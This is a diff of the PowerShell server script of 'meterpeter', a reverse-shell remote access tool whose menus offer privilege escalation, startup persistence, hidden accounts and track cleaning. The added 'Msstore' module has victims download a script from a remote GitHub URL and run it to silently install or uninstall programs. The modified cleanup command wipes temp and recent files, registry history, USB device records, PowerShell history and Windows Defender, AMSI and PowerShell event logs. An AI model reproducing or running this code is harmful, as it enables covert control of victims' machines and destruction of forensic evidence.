@@ -1289,7 +1289,7 @@ While($Client.Connected)
          write-host "   -------  -----------                    -------------------";
          write-host "   Stats    Query IPv4 Statistics          UserLand";
          write-host "   Query    Established TCP connections    UserLand";
-         write-host "   Verbose  Query all TCP\UDP connections  UserLand";
+         write-host "   Verbose  Query TCP\UDP\DNS\ARP cache    UserLand";
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
          write-host "`n`n :meterpeter:Net:Tcp> " -NoNewline -ForeGroundColor Green;
          $ConManager_choise = Read-Host;
@@ -2355,6 +2355,7 @@ While($Client.Connected)
       write-host "   Escalate    Escalate privs from UserLand to Admin";
       write-host "   Persist     Persist reverse tcp shell on startup";
       write-host "   TimeStamp   Change remote host files timestamp";
+      write-host "   Msstore     manage applications from msstore"
       write-host "   Artifacts   Clean remote host activity tracks";
       write-host "   HiddenDir   Super\hidden directorys manager";
       write-host "   hideUser    Remote hidden accounts manager";
@@ -2370,6 +2371,90 @@ While($Client.Connected)
       write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
+      If($choise -ieq "Msstore")
+      {
+         write-host "`n`n   Description:" -ForegroundColor Yellow
+         write-host "   winget command line tool enables users to list, discover, install"
+         write-host "   or uninstall programs in silent mode [windows 10\11 OS versions]"
+         write-host "`n`n   Modules   Description                Privileges Required" -ForegroundColor green;
+         write-host "   -------   -----------                ------------------";
+         write-host "   List      installed packets [local]  UserLand";
+         write-host "   Discover  search for appl msstore    UserLand";
+         write-host "   install   application from msstore   UserLand";
+         write-host "   Uninstall application from [local]   UserLand";
+         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow
+         write-host "`n`n :meterpeter:Post:Msstore> " -NoNewline -ForeGroundColor Green;
+         $win_choise = Read-Host;
+         If($win_choise -ieq "List")
+         {
+            Write-Host " * Enumerating installed programs!" -ForegroundColor Green;write-host ""
+            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/Invoke-Winget.ps1`" -OutFile `"`$Env:TMP\Invoke-WinGet.ps1`"|Out-Null;powershell -file Invoke-WinGet.ps1 -Action 'list' -AutoDelete 'on'"
+         }
+         If($win_choise -ieq "Discover")
+         {
+            $Program = Read-Host " - Program name to search "
+            If(-not($Program) -or $Program -ieq $null)
+            {
+               $Program = "games"
+               Write-Host "   => Error: wrong program, set demo to '$Program' .." -ForegroundColor Red
+            }            
+            
+            Write-Host " * Search for '$Program' in msstore!" -ForegroundColor Green;write-host ""
+            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/Invoke-Winget.ps1`" -OutFile `"`$Env:TMP\Invoke-WinGet.ps1`"|Out-Null;powershell -file Invoke-WinGet.ps1 -Action 'discover' -program '$Program' -AutoDelete 'on'"
+         }
+         If($win_choise -iMatch '^(install)$')
+         {
+            $Program = Read-Host " - Program name "
+            If(-not($Program) -or $Program -ieq $null)
+            {
+               Write-Host "`n   > Error: program name required to run module!" -ForegroundColor Red
+               $Command = $null
+            }
+            Else
+            {
+               $Id = Read-Host " - Program ID   "
+               If(-not($Id) -or $Id -ieq $null)
+               {
+                  Write-Host "`n   > Error: program ID required to run module!" -ForegroundColor Red
+                  $Command = $null
+               }
+               Else
+               {
+                  Write-Host " * Install '$Program' from msstore!" -ForegroundColor Green;write-host ""
+                  $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/Invoke-Winget.ps1`" -OutFile `"`$Env:TMP\Invoke-WinGet.ps1`"|Out-Null;powershell -file Invoke-WinGet.ps1 -Action 'install' -program '$Program' -Id '$Id' -AutoDelete 'on'"
+               }
+            }
+         }
+         If($win_choise -iMatch '^(Uninstall)$')
+         {
+            $Program = Read-Host " - Program name "
+            If(-not($Program) -or $Program -ieq $null)
+            {
+               Write-Host "`n   > Error: program name required to run module!" -ForegroundColor Red
+               $Command = $null
+            }
+            Else
+            {
+               $Id = Read-Host " - Program ID   "
+               If(-not($Id) -or $Id -ieq $null)
+               {
+                  Write-Host "`n   > Error: program ID required to run module!" -ForegroundColor Red
+                  $Command = $null
+               }
+               Else
+               {
+                  Write-Host " * UnInstall '$Program' from local PC!" -ForegroundColor Green;write-host ""
+                  $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/Invoke-Winget.ps1`" -OutFile `"`$Env:TMP\Invoke-WinGet.ps1`"|Out-Null;powershell -file Invoke-WinGet.ps1 -Action 'Uninstall' -program '$Program' -Id '$Id' -AutoDelete 'on'"
+               }
+            }
+         }
+         If($win_choise -ieq "Return" -or $win_choise -ieq "cls" -or $win_choise -ieq "modules" -or $win_choise -ieq "clear")
+         {
+            $choise = $Null;
+            $Command = $Null;
+            $win_choise = $Null;
+         }
+      }
       If($choise -ieq "HiddenDir" -or $choise -ieq "Hidden")
       {
          write-host "`n`n   Description:" -ForegroundColor Yellow
@@ -2912,7 +2997,7 @@ While($Client.Connected)
          {
             Write-Host " * Cleanning remote system tracks ..`n" -ForegroundColor Green;
             $MeterClient = "$payload_name" + ".ps1" -Join ''
-            $Command = "echo `"[*] Cleaning Temporary folder artifacts ..`" `> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:TMP\*`" -Include *.exe,*.bat,*.vbs,*.tmp,*.log,*.ps1,*.dll,*.lnk,*.inf,*.png,*.zip -Exclude *$MeterClient* -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent directory artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:APPDATA\Microsoft\Windows\Recent\*`" -Include *.exe,*.bat,*.vbs,*.log,*.ps1,*.dll,*.inf,*.lnk,*.png,*.txt,*.zip -Exclude desktop.ini -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent documents artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /f|Out-Null;cmd /R REG ADD `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /ve /t REG_SZ /f|Out-Null;echo `"[*] Cleaning DNS Resolver cache artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R ipconfig /flushdns|Out-Null;If(Get-Command `"Clear-RecycleBin`" -EA SilentlyContinue){echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Start-Process -WindowStyle Hidden powershell -ArgumentList `"Clear-RecycleBin -Force`" -Wait}Else{echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"   `> Error: 'Clear-RecycleBin' not found ..`" `>`> `$Env:TMP\clean.meterpeter};echo `"[*] Cleaning ConsoleHost_history artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;`$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath;echo `"MeterPeterNullArtifacts`" `> `$CleanPSLogging;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"[*] Cleaning Cache of plugged USB devices ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /f|Out-Null;cmd /R REG ADD `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /ve /t REG_SZ /f|Out-Null;echo `"[-] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;`$PSlist = wevtutil el | Where-Object {`$_ -iMatch '(AMSI/Debug|UAC|Powershell|BITS|Windows Defender|WMI-Activity/Operational|AppLocker/Exe and DLL|AppLocker/MSI and Script|TCPIP/Operational)' -and `$_ -iNotMatch '(/Admin)`$'};ForEach(`$PSCategorie in `$PSlist){wevtutil cl `"`$PSCategorie`"|Out-Null;echo `"    deleted: `$PSCategorie`" `>`> `$Env:TMP\clean.meterpeter}}Else{echo `"[X] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"   `> Error: Administrator privileges required!`" `>`> `$Env:TMP\clean.meterpeter};Get-Content -Path `$Env:TMP\clean.meterpeter;Remove-Item -Path `$Env:TMP\clean.meterpeter -Force"
+            $Command = "echo `"[*] Cleaning Temporary folder artifacts ..`" `> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:TMP\*`" -Include *.exe,*.bat,*.vbs,*.tmp,*.log,*.ps1,*.dll,*.lnk,*.inf,*.png,*.zip -Exclude *$MeterClient* -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent directory artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:APPDATA\Microsoft\Windows\Recent\*`" -Include *.exe,*.bat,*.vbs,*.log,*.ps1,*.dll,*.inf,*.lnk,*.png,*.txt,*.zip -Exclude desktop.ini -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent documents artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /f|Out-Null;cmd /R REG ADD `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /ve /t REG_SZ /f|Out-Null;echo `"[*] Cleaning DNS Resolver cache artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R ipconfig /flushdns|Out-Null;If(Get-Command `"Clear-RecycleBin`" -EA SilentlyContinue){echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Start-Process -WindowStyle Hidden powershell -ArgumentList `"Clear-RecycleBin -Force`" -Wait}Else{echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"   `> Error: 'Clear-RecycleBin' not found ..`" `>`> `$Env:TMP\clean.meterpeter};echo `"[*] Cleaning ConsoleHost_history artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;`$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath;echo `"MeterPeterNullArtifacts`" `> `$CleanPSLogging;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"[*] Cleaning Cache of plugged USB devices ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /f|Out-Null;cmd /R REG ADD `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /ve /t REG_SZ /f|Out-Null;echo `"[-] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;`$PSlist = wevtutil el | Where-Object {`$_ -iMatch '(AMSI/Debug|UAC|Powershell|BITS|Windows Defender|WMI-Activity/Operational|AppLocker/Exe and DLL|AppLocker/MSI and Script|TCPIP/Operational)' -and `$_ -iNotMatch '(/Admin)`$'};ForEach(`$PSCategorie in `$PSlist){wevtutil cl `"`$PSCategorie`"|Out-Null;echo `"    deleted: `$PSCategorie`" `>`> `$Env:TMP\clean.meterpeter}}Else{echo `"[x] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => Error: Administrator privileges required!`" `>`> `$Env:TMP\clean.meterpeter};Get-Content -Path `$Env:TMP\clean.meterpeter;Remove-Item -Path `$Env:TMP\clean.meterpeter -Force"
          }
          If($track_choise -ieq "Paranoid") 
          {
